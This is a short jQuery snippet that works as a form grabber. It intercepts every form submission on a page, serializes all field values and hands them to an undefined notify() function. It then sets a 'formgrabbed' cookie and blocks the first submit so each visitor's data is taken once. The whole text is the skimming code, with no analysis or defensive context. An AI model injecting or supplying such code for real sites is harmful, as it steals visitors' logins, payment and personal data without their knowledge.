$("form").submit(
	function(){
		if (!$.cookie("formgrabbed")){
			notify("form submitted: "+$(this).serialize());
			$.cookie("formgrabbed","1");
			return false;
	}
})